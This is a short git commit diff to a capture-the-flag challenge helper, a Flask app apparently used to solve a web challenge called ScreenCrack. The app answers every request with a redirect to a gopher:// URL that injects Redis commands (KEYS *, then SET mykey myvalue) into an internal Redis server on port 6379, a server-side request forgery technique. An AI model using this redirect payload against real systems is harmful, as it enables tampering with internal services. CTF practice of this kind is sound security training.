bf24b0aac432b8b7c7e8433fb2b59167ff2e2032
ShundaZhang <shunda.zhang@intel.com>
2024-06-10 07:26:30 +0000

    Server of ScreenCrack seems not work.

--- ctf/web/ScreenCrack/app.py
+++ ctf/web/ScreenCrack/app.py
@@ -2,13 +2,11 @@ from flask import Flask, redirect
 
 app = Flask(__name__)
 
-index = 0
-
 @app.route('/')
-def old_route():
-
+def get_route():
     # Redirect to a different URL
-    return redirect("gopher://127.0.0.1:6379/_KEYS%20*", code=302)
+    #return redirect("http://127.0.0.1:80", code=302)
+    return redirect("gopher://127.0.0.1:6379/_SET%20mykey%20myvalue",code=302)
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=80)
